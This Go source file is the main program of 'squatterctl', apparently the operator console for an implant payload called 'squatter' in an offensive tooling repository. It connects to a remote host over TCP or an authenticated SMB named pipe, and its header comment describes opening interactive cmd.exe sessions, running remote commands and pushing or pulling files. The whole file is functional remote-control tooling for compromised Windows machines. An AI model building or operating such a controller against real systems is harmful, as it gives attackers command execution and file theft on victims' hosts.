// Command squatterctl is the client/shell for the squatter mux server.
//
// At the prompt you invoke a module by name (e.g. "echo a b") and talk to it
// directly; bare cmd opens an interactive cmd.exe stream, cmd <command...>
// runs through cmd.exe /c, and getfile/putfile stream files of any size through
// a fixed buffer.
//
//	squatterctl [host] [port]           # the shell (default)
//	squatterctl --demo [host] [port]    # scripted echo walkthrough
//	squatterctl --streams N [host] [port]
package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"

	"github.com/vibepwners/hovel/payloads/squatter/client/shell"
	"github.com/vibepwners/hovel/payloads/squatter/client/smbpipe"
)

func main() {
	opts, err := shell.ParseCLI(os.Args[1:])
	if err != nil {
		fmt.Fprintln(os.Stderr, "usage:", err)
		os.Exit(2)
	}
	conn, err := dial(opts)
	if err != nil {
		fmt.Fprintln(os.Stderr, "connect:", err)
		os.Exit(1)
	}
	defer func() {
		if err := conn.Close(); err != nil {
			fmt.Fprintln(os.Stderr, "close:", err)
		}
	}()

	client := shell.New(conn)
	switch opts.Mode {
	case shell.ModeDemo:
		client.RunDemo(os.Stdout)
	case shell.ModeStreams:
		client.RunStreams(os.Stdout, opts.Streams)
	default:
		if isPiped(os.Stdin) {
			client.Run(os.Stdin, os.Stdout)
			return
		}
		client.RunPrompt(net.JoinHostPort(opts.Host, opts.Port))
	}
}

func isPiped(file *os.File) bool {
	info, err := file.Stat()
	if err != nil {
		return false
	}
	return info.Mode()&os.ModeCharDevice == 0
}

func dial(opts shell.CLIOptions) (io.ReadWriteCloser, error) {
	if opts.SMB {
		password := opts.Password
		if password == "" {
			password = os.Getenv("SQUATTER_SMB_PASSWORD")
		}
		return smbpipe.Dialer{}.Dial(context.Background(), smbpipe.Options{
			Host:     opts.Host,
			Port:     opts.SMBPort,
			Domain:   opts.Domain,
			Username: opts.Username,
			Password: password,
			Pipe:     opts.Pipe,
		})
	}
	return net.Dial("tcp", net.JoinHostPort(opts.Host, opts.Port))
}
